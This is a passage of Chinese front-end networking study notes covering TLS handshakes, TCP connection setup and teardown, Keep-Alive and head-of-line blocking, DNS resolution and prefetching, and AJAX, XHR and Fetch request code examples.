随机数 A</td><td align="left">-</td></tr><tr><td align="left">ServerHello</td><td align="left">服务器响应：选定的 TLS 版本和加密套件 + 随机数 B + 数字证书（含公钥）</td><td align="left">非对称加密基础</td></tr><tr><td align="left">证书验证</td><td align="left">客户端验证证书：颁发机构（CA）可信性 + 域名匹配 + 有效期 + 证书链完整性</td><td align="left">数字签名技术</td></tr><tr><td align="left">交换密钥</td><td align="left">客户端：生成预主密钥，使用公钥加密预主密钥并发送给服务器</td><td align="left">非对称加密（RSA&#x2F;ECC）</td></tr><tr><td align="left">生成会话密钥</td><td align="left">双方使用随机数 A&#x2F;B + 预主密钥计算会话密钥</td><td align="left">密钥派生函数</td></tr><tr><td align="left">加密通信就绪</td><td align="left">双方交换<code>Finished</code>消息验证密钥正确性，后续通信使用会话密钥对称加密</td><td align="left">对称加密</td></tr></tbody></table><p>流程图如下：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Client->>Server: ClientHello (TLS版本 + 加密套件 + 随机数A)    Server->>Client: ServerHello (加密套件 + 随机数B) + 证书    Note right of Client: 证书验证 (CA链/域名/有效期)    Client->>Server: 加密的预主密钥 (用服务器公钥)    Note left of Server: 生成会话密钥 (随机数A+B+预主密钥)    Server->>Client: [Finished]    Client->>Server: [Finished]    Note over Client,Server: 后续通信使用会话密钥对称加密</pre><p><strong>证书验证机制</strong></p><table><thead><tr><th align="left">验证环节</th><th align="left">技术原理</th></tr></thead><tbody><tr><td align="left">证书链信任</td><td align="left">客户端预置根 CA 证书 -&gt; 验证中间 CA 签名 -&gt; 验证服务器证书签名</td></tr><tr><td align="left">域名检查</td><td align="left">检查服务器返回证书里的 subject alternative name（SAN） 或 common name（CN） 是否与访问域名一致</td></tr><tr><td align="left">吊销检查</td><td align="left">通过 OCSP （在线证书状态协议）或 CRL （证书吊销列表）验证证书有效性</td></tr></tbody></table><p><strong>混合加密优势</strong></p><table><thead><tr><th align="left">阶段</th><th align="left">技术</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">握手阶段</td><td align="left">非对称加密</td><td align="left">安全传输会话密钥（防窃听）</td></tr><tr><td align="left">数据传输阶段</td><td align="left">对称加密</td><td align="left">高性能加密业务数据（千倍于非对称）</td></tr></tbody></table><p><strong>前端关键影响</strong></p><ul><li>安全实践：<ul><li>必须使用 HTTPS 访问所有资源（避免混合内容警告）</li><li>使用 <code>Strict-Transport-Security</code> 头强制 HTTPS</li></ul></li><li>性能优化：<ul><li>启用 TLS 会话复用（session resumption），减少握手开销</li><li>使用 ECDHE 密钥交换（前向保密）</li></ul></li></ul><h2 id="1-2-TCP-UDP基础"><a href="#1-2-TCP-UDP基础" class="headerlink" title="1.2 TCP&#x2F;UDP基础"></a>1.2 TCP&#x2F;UDP基础</h2><h3 id="三次握手与四次挥手流程"><a href="#三次握手与四次挥手流程" class="headerlink" title="三次握手与四次挥手流程"></a>三次握手与四次挥手流程</h3><p><strong>三次握手（连接建立）</strong></p><p>流程图解：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Note left of Client: CLOSED → SYN_SENT    Client->>Server: SYN=1, seq=x (随机序列号)    Note right of Server: LISTEN → SYN_RCVD    Server->>Client: SYN=1, ACK=1, seq=y, ack=x+1    Note left of Client: SYN_SENT → ESTABLISHED    Client->>Server: ACK=1, seq=x+1, ack=y+1    Note right of Server: SYN_RCVD → ESTABLISHED</pre><p>核心步骤：</p><ul><li>第一次握手<ul><li>客户端发送 SYN&#x3D;1（同步标志）和随机序列号 seq&#x3D;x</li><li>状态变化：客户端进入 SYN_SENT</li></ul></li><li>第二次握手<ul><li>服务器返回 SYN&#x3D;1 + ACK&#x3D;1（确认标志），携带自己的序列号 seq&#x3D;y 和确认号 ack&#x3D;x+1</li><li>状态变化：服务器进入 SYN_RCVD</li></ul></li><li>第三次握手<ul><li>客户端发送 ACK&#x3D;1，确认号 ack&#x3D;y+1</li><li>状态变化：双方进入 ESTABLISHED</li></ul></li></ul><p>设计目的：</p><ul><li>确认双方的收发能力正常</li><li>同步初始序列号（防历史链接混乱）</li></ul><p><strong>四次挥手（连接释放）</strong></p><p>流程图解：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Note left of Client: ESTABLISHED → FIN_WAIT_1    Client->>Server: FIN=1, seq=u    Note right of Server: ESTABLISHED → CLOSE_WAIT    Server->>Client: ACK=1, ack=u+1    Note left of Client: FIN_WAIT_1 → FIN_WAIT_2    Server->>Client: FIN=1, seq=v, ack=u+1    Note right of Server: CLOSE_WAIT → LAST_ACK    Client->>Server: ACK=1, ack=v+1    Note left of Client: FIN_WAIT_2 → TIME_WAIT (2MSL后CLOSED)    Note right of Server: LAST_ACK → CLOSED</pre><p>核心步骤：</p><ul><li>第一次挥手<ul><li>主动方发送 FIN&#x3D;1（结束标志）和序列号 seq&#x3D;u</li><li>状态变化：主动方进入 FIN_WAIT_1</li></ul></li><li>第二次挥手<ul><li>被动方返回 ACK&#x3D;1 和确认号 ack&#x3D;u+1</li><li>状态变化：被动方进入 CLOSE_WAIT（半关闭状态）</li></ul></li><li>第三次挥手<ul><li>被动方发送自己的 FIN&#x3D;1 和序列号 seq&#x3D;v</li><li>状态变化：被动方进入 LAST_ACK</li></ul></li><li>第四次挥手<ul><li>主动方发送 ACK&#x3D;1 和确认号 ack&#x3D;v+1</li><li>状态变化：主动方进入 TIME_WAIT（等待2MSL后关闭）</li></ul></li></ul><p>关键机制：</p><ul><li>TIME_WAIT状态：<ul><li>持续2MSL（报文最大生存时间，通常1-4分钟）</li><li>目的：确保最后一个 ACK 到达 + 让网络中残留报文失效</li></ul></li><li>半关闭状态：被动方可在 CLOSE_WAIT 阶段继续发送数据</li></ul><p><strong>与 HTTP 协议的关系</strong></p><ul><li>HTTP&#x2F;1.1：三次握手后完成单个请求-响应，默认 Connection: keep-alive 复用 TCP 连接</li><li>连接开销：高频短连接场景（如HTTP&#x2F;1.0）会因反复握手&#x2F;挥手导致性能下降</li></ul><h3 id="连接复用（Keep-Alive）与队头阻塞问题"><a href="#连接复用（Keep-Alive）与队头阻塞问题" class="headerlink" title="连接复用（Keep-Alive）与队头阻塞问题"></a>连接复用（Keep-Alive）与队头阻塞问题</h3><p><strong>连接复用（Keep-Alive）</strong></p><p>定义：通过复用同一个 TCP 连接处理多个 HTTP 请求&#x2F;响应，避免重复的三次握手和四次挥手，降低延迟和资源消耗。</p><p>工作原理：</p><ul><li>HTTP&#x2F;1.1：默认启用Connection: keep-alive，允许复用连接。</li><li>HTTP头部控制：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive  // 启用复用<br><span class="hljs-attribute">Keep-Alive</span><span class="hljs-punctuation">: </span>timeout=5, max=100  // 空闲超时5秒，最多复用100次请求<br></code></pre></td></tr></table></figure><p>优势：</p><ul><li>减少 TCP 握手&#x2F;挥手开销（节省1-2 RTT&#x2F;请求）</li><li>降低服务器和客户端资源占用（减少 Socket 创建和销毁）</li></ul><p>示例流程：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Client->>Server: GET /page1 HTTP/1.1 (Connection: keep-alive)    Server->>Client: HTTP/1.1 200 OK (Connection: keep-alive)    Client->>Server: GET /page2 HTTP/1.1 (复用同一TCP连接)    Server->>Client: HTTP/1.1 200 OK</pre><p><strong>队头阻塞（Head-of-Line Blocking）</strong></p><p>定义：当单个 TCP 连接中的前一个请求未完成时，后续请求必须等待，即使它们彼此独立。</p><p>两种类型：</p><ul><li>TCP 层队头阻塞<ul><li>原因：TCP 保证数据有序交付，丢失包会阻塞后续包的重传。</li><li>影响：即使HTTP&#x2F;2复用连接，仍受底层TCP限制。</li></ul></li><li>HTTP&#x2F;1.1层队头阻塞<ul><li>原因：HTTP&#x2F;1.1的管道化（pipelining）请求必须按顺序返回响应。</li><li>示例：</li></ul></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">GET /resource1  // 慢请求<br>GET /resource2  // 被阻塞直到resource1完成<br></code></pre></td></tr></table></figure><p>解决方案：</p><ul><li>HTTP&#x2F;2：引入多路复用（Multiplexing），通过二进制分帧层实现并行请求。</li><li>HTTP&#x2F;3：基于QUIC协议（UDP），彻底解决TCP层队头阻塞。</li></ul><p><strong>对比总结</strong></p><table><thead><tr><th align="left">特性</th><th align="left">连接复用（Keep-Alive）</th><th align="left">队头阻塞问题</th></tr></thead><tbody><tr><td align="left">作用层级</td><td align="left">HTTP&#x2F;1.1及以上</td><td align="left">TCP层 + HTTP&#x2F;1.1管道化</td></tr><tr><td align="left">主要优化</td><td align="left">减少握手开销</td><td align="left">需HTTP&#x2F;2或QUIC解决</td></tr><tr><td align="left">性能影响</td><td align="left">提升短连接场景性能</td><td align="left">高延迟环境下性能下降显著</td></tr></tbody></table><p><strong>前端优化实践</strong></p><ol><li>HTTP&#x2F;1.1优化：使用多个域名（分片）绕过浏览器对单域名连接数的限制（通常6-8个）</li><li>升级协议：优先使用HTTP&#x2F;2（多路复用）或HTTP&#x2F;3（QUIC）。</li><li>资源合并：减少请求数量（如CSS&#x2F;JS合并），降低队头阻塞影响。</li></ol><h2 id="1-3-DNS解析机制"><a href="#1-3-DNS解析机制" class="headerlink" title="1.3 DNS解析机制"></a>1.3 DNS解析机制</h2><h3 id="域名解析流程（递归查询-权威解析）"><a href="#域名解析流程（递归查询-权威解析）" class="headerlink" title="域名解析流程（递归查询&#x2F;权威解析）"></a>域名解析流程（递归查询&#x2F;权威解析）</h3><p><strong>核心流程步骤</strong></p><pre class="mermaid">sequenceDiagram    participant User    participant LocalDNS as 本地DNS<br>(递归解析器)    participant RootDNS as 根DNS    participant TLDNS as 顶级域DNS<br>(如.com)    participant AuthDNS as 权威DNS<br>(如example.com)        User->>LocalDNS: 查询 www.example.com    alt 缓存命中        LocalDNS-->>User: 直接返回IP (缓存)    else 递归查询        LocalDNS->>RootDNS: 请求 .com 的TLD地址        RootDNS-->>LocalDNS: 返回 .com TLD地址        LocalDNS->>TLDNS: 请求 example.com 权威服务器        TLDNS-->>LocalDNS: 返回 example.com NS记录        LocalDNS->>AuthDNS: 请求 www.example.com A记录        AuthDNS-->>LocalDNS: 返回IP地址        LocalDNS->>User: 返回最终IP    end</pre><p><strong>递归查询（Recursive Query）</strong></p><ul><li>发起者：客户端（浏览器&#x2F;操作系统） → 本地 DNS 服务器</li><li>特点：<ul><li>客户端只发送一次请求</li><li>本地 DNS 负责完整解析流程，最终返回IP或错误</li></ul></li><li>客户端要求：<code>dig +recursive www.example.com</code></li></ul><p><strong>权威解析（Authoritative Resolution）</strong></p><ul><li>执行者：权威 DNS 服务器（管理特定域名的 DNS 记录）</li><li>记录类型：</li></ul><table><thead><tr><th align="left">记录</th><th align="left">作用</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">A</td><td align="left">IPv4地址</td><td align="left"><a href="http://www.example.com/">www.example.com</a>. 300 IN A 192.0.2.1</td></tr><tr><td align="left">AAAA</td><td align="left">IPv6地址</td><td align="left">… IN AAAA 2001:db8::1</td></tr><tr><td align="left">NS</td><td align="left">指定域名的权威服务器</td><td align="left">example.com. IN NS ns1.example.com</td></tr><tr><td align="left">CNAME</td><td align="left">域名别名</td><td align="left">www IN CNAME example.com</td></tr></tbody></table><p><strong>迭代查询（Iterative Query - 实际执行方式）</strong></p><ul><li>发生位置：本地 DNS 服务器 → 根&#x2F;TLD&#x2F;权威DNS</li><li>流程特点:<ol><li>本地 DNS 查询根 DNS（全球13组）获取 TLD 地址</li><li>查询TLD DNS（如.com注册局）获取权威 DNS</li><li>查询权威 DNS 获取最终A&#x2F;AAAA记录</li></ol></li><li>响应类型：<ul><li>非权威应答：返回下级 DNS 地址（转发）</li><li>权威应答：直接返回 IP（最终结果）</li></ul></li></ul><p><strong>缓存机制</strong></p><ul><li>本地DNS缓存：<ul><li>根据 TTL（Time-To-Live）缓存记录（如300秒）</li><li>减少全球 DNS 查询压力</li></ul></li><li>浏览器&#x2F;OS缓存：<ul><li>ipconfig &#x2F;displaydns（Windows）查看缓存</li><li>缓存过期后重新触发递归查询</li></ul></li></ul><p><strong>前端性能影响</strong></p><ul><li>优化手段：<ul><li>减少域名数量（降低 DNS 查询次数）</li><li>使用<code>&lt;link rel=&quot;dns-prefetch&quot;&gt;</code>预解析关键域名</li></ul></li><li>安全机制：<ul><li>DNSSEC：防止 DNS 欺骗（数字签名验证）</li><li>DoH&#x2F;DoT：加密 DNS 查询（防止监听）</li></ul></li></ul><h3 id="DNS预取（dns-prefetch）与缓存优化"><a href="#DNS预取（dns-prefetch）与缓存优化" class="headerlink" title="DNS预取（dns-prefetch）与缓存优化"></a>DNS预取（dns-prefetch）与缓存优化</h3><p><strong>DNS预取（dns-prefetch）</strong></p><p>定义：浏览器提前解析后续页面可能访问的域名，将 DNS 查询与页面渲染并行执行，减少用户感知延迟。</p><p>实现方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 在HTML头部声明需预取的域名 --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//cdn.example.com&quot;&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//api.example.com&quot;&gt;<br></code></pre></td></tr></table></figure><p>工作流程：</p><ol><li>浏览器解析 HTML 时发现 dns-prefetch 标签</li><li>后台启动 DNS 查询（不阻塞页面渲染）</li><li>结果缓存至 DNS 缓存池</li><li>实际请求资源时直接使用缓存 IP</li></ol><p>性能影响：</p><ul><li>典型DNS查询耗时：50-200ms</li><li>预取后延迟：≈0ms（命中缓存时）</li><li>适用场景：<ul><li>第三方资源（CDN、分析脚本）</li><li>多域名架构下的跨域请求</li></ul></li></ul><p><strong>DNS缓存优化机制</strong></p><p>缓存层级：</p><table><thead><tr><th align="left">层级</th><th align="left">缓存位置</th><th align="left">存活时间</th><th align="left">控制方式</th></tr></thead><tbody><tr><td align="left">浏览器</td><td align="left">内存缓存</td><td align="left">会话级（关闭标签页失效）</td><td align="left">自动管理</td></tr><tr><td align="left">操作系统</td><td align="left">系统DNS缓存</td><td align="left">遵循TTL（默认分钟~小时）</td><td align="left">ipconfig &#x2F;flushdns</td></tr><tr><td align="left">本地DNS</td><td align="left">递归解析器缓存</td><td align="left">严格遵循TTL</td><td align="left">ISP&#x2F;管理员配置</td></tr></tbody></table><p>TTL（Time-To-Live）核心作用：</p><ul><li>DNS记录中设置的有效期（秒）：<code>example.com. 300 IN A 192.0.2.1 # TTL=300秒</code></li><li>平衡矛盾：<ul><li>高TTL（数小时）：减少查询次数，提升速度</li><li>低TTL（秒级）：快速更新DNS记录（如故障转移）</li></ul></li></ul><p>缓存刷新策略：</p><ul><li>前端无法直接控制，但可通过以下方式间接优化：<ul><li>关键域名使用稳定IP（避免频繁变更）</li><li>迁移到HTTP&#x2F;2+减少域名分片（降低DNS查询需求）</li></ul></li></ul><p><strong>联合优化实践</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 步骤1: 预取关键域名 --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//static.example.com&quot;&gt;<br><br>&lt;!-- 步骤2: 预连接（DNS+TCP+TLS三合一优化） --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;//api.example.com&quot; crossorigin&gt;<br></code></pre></td></tr></table></figure><blockquote><p>preconnect：提前完成DNS+TCP握手+TLS协商（节省3-4次RTT）</p></blockquote><h1 id="二、网络请求技术"><a href="#二、网络请求技术" class="headerlink" title="二、网络请求技术"></a>二、网络请求技术</h1><h2 id="2-1-请求处理"><a href="#2-1-请求处理" class="headerlink" title="2.1 请求处理"></a>2.1 请求处理</h2><h3 id="AJAX原理与XMLHttpRequest对象"><a href="#AJAX原理与XMLHttpRequest对象" class="headerlink" title="AJAX原理与XMLHttpRequest对象"></a>AJAX原理与XMLHttpRequest对象</h3><p><strong>AJAX 核心原理</strong></p><p>定义：Asynchronous JavaScript and XML（异步JavaScript和XML），通过浏览器内置对象在不刷新页面的情况下与服务器交换数据并更新部分网页内容。</p><p>工作流程：</p><pre class="mermaid">sequenceDiagram    participant User    participant Browser    participant Server    User->>Browser: 触发事件（点击/滚动等）    Browser->>Server: 发送异步请求（XHR对象）    Server->>Browser: 返回数据（JSON/XML/Text）    Browser->>Browser: 解析数据 → 更新DOM    Browser-->>User: 局部刷新页面</pre><p>关键特性：</p><ul><li>异步通信：不阻塞用户界面（对比传统表单提交）</li><li>数据格式：现代应用主要用JSON替代XML</li><li>同源策略：默认只能请求相同协议&#x2F;域名&#x2F;端口的资源（可通过CORS解除）</li></ul><p><strong>XMLHttpRequest（XHR）对象详解</strong></p><p>创建与初始化：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();  <span class="hljs-comment">// 创建实例</span><br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 初始化（方法, URL, 异步）</span><br></code></pre></td></tr></table></figure><p>核心方法：</p><table><thead><tr><th align="left">方法</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">.open(method, url, async)</td><td align="left">配置请求类型、地址、异步标志</td></tr><tr><td align="left">.send([body])</td><td align="left">发送请求（可选请求体如JSON）</td></tr><tr><td align="left">.setRequestHeader(name, value)</td><td align="left">设置请求头（如Content-Type）</td></tr><tr><td align="left">.abort()</td><td align="left">终止请求</td></tr></tbody></table><p>关键属性：</p><table><thead><tr><th align="left">属性</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">.readyState</td><td align="left">请求状态（0-4）</td></tr><tr><td align="left">.status</td><td align="left">HTTP状态码（如200, 404）</td></tr><tr><td align="left">.responseText</td><td align="left">文本响应数据</td></tr><tr><td align="left">.responseXML</td><td align="left">XML格式响应（已淘汰）</td></tr><tr><td align="left">.responseType</td><td align="left">指定响应格式（如json）</td></tr></tbody></table><p>事件监听（异步处理）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>));<br>  &#125;<br>&#125;;<br><span class="hljs-comment">// 或使用现代事件监听</span><br>xhr.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.<span class="hljs-property">status</span> &lt; <span class="hljs-number">300</span>) &#123;<br>    <span class="hljs-comment">// 成功处理</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>Ajax 技术演进：</p><table><thead><tr><th align="left">技术阶段</th><th align="left">典型实现</th><th align="left">缺陷</th></tr></thead><tbody><tr><td align="left">原生XHR</td><td align="left">new XMLHttpRequest()</td><td align="left">回调地狱、繁琐错误处理</td></tr><tr><td align="left">jQueryAJAX</td><td align="left">$.ajax({ … })</td><td align="left">依赖jQuery库</td></tr><tr><td align="left">Fetch API</td><td align="left">fetch(url).then(…)</td><td align="left">更简洁的Promise方案</td></tr></tbody></table><p><strong>前端开发关键点</strong></p><p>（1）错误处理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">xhr.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* 网络错误处理 */</span> &#125;;<br>xhr.<span class="hljs-property">ontimeout</span> = <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* 超时处理 */</span> &#125;;<br></code></pre></td></tr></table></figure><p>（2）Content-Type 设置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;value&#x27;</span> &#125;));<br></code></pre></td></tr></table></figure><p>（3）跨域请求</p><ul><li>需服务器设置Access-Control-Allow-Origin</li><li>可通过代理服务器转发</li></ul><h3 id="Fetch-API及与XHR对比"><a href="#Fetch-API及与XHR对比" class="headerlink" title="Fetch API及与XHR对比"></a>Fetch API及与XHR对比</h3><p><strong>Fetch API 核心原理</strong></p><p>定义：基于 Promise 的现代网络请求接口，替代传统 XMLHttpRequest（XHR），提供更简洁、强大的请求处理能力。</p><p>基本语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">fetch</span>(url, options)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network error&#x27;</span>);<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>(); <span class="hljs-comment">// 解析JSON响应</span><br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));<br></code></pre></td></tr></table></figure><p>核心特性：</p><table><thead><tr><th align="left">特性</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">Promise 驱动</td><td align="left">链式调用替代回调嵌套，支持 async&#x2F;await</td></tr><tr><td align="left">流式数据处理</td><td align="left">响应体可分段读取（response.body），支持大文件处理</td></tr><tr><td align="left">默认不携带Cookie</td><td align="left">需显式设置 credentials: ‘include’</td></tr><tr><td align="left">更灵活的配置</td><td align="left">通过 init 对象配置所有参数</td></tr><tr><td align="left">内置响应类型</td><td align="left">支持 response.json()&#x2F;.text()&#x2F;.blob()&#x2F;.arrayBuffer() 等转换方法</td></tr></tbody></table><p>完整配置项：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">fetch</span>(url, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,          <span class="hljs-comment">// GET/POST/PUT/DELETE</span><br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;Bearer token&#x27;</span><br>  &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data), <span class="hljs-comment">// 支持多种数据类型</span><br>  <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>,   <span class="hljs-comment">// 携带Cookie</span><br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;cors&#x27;</span>,             <span class="hljs-comment">// 跨域模式</span><br>  <span class="hljs-attr">cache</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,        <span class="hljs-comment">// 缓存控制</span><br>  <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;follow&#x27;</span>        <span class="hljs-comment">// 重定向策略</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Fetch API 与 XHR 关键对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">Fetch API</th><th align="left">XMLHttpRequest (XHR)</th></tr></thead><tbody><tr><td align="left">设计理念</td><td align="left">Promise 驱动的现代化 API</td><td align="left">基于事件的旧式 API</td></tr><tr><td align="left">语法复杂度</td><td align="left">简洁（链式调用）</td><td align="left">冗长（事件监听 + 状态检查）</td></tr><tr><td align="left">错误处理</td><td align="left">只对网络错误 reject（HTTP 404&#x2F;500 需手动处理）</td><td align="left">通过 status 检测所有错误</td></tr><tr><td align="left">超时控制</td><td align="left">需结合 AbortController 实现</td><td align="left">原生支持 timeout 属性</td></tr><tr><td align="left">进度追踪</td><td align="left">无原生进度事件</td><td align="left">支持 progress 事件（上传&#x2F;下载）</td></tr><tr><td align="left">请求取消</td><td align="left">通过 AbortController.abort()</td><td align="left">原生 xhr.abort()</td></tr><tr><td align="left">Cookie 策略</td><td align="left">默认不发送（更安全）</td><td align="left">默认发送（需手动禁止）</td></tr><tr><td align="left">响应类型处理</td><td align="left">通过方法转换（如 .json()）</td><td align="left">通过属性访问（如 responseText）</td></tr><tr><td align="left">跨域请求</td><td align="left">默认遵循 CORS</td><td align="left">同样遵循 CORS</td></tr></tbody></table><p><strong>典型场景代码对比</strong></p><p>（1）GET 请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Fetch</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data));<br><br><span class="hljs-comment">// XHR</span><br><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>xhr.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>));<br>xhr.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><p>（2）POST 请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Fetch</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/submit&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;)<br>&#125;);<br><br><span class="hljs-comment">// XHR</span><br><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/api/submit&#x27;</span>);<br>xhr.<span class="hljs-title function_">setRequestHeader</span>(<span 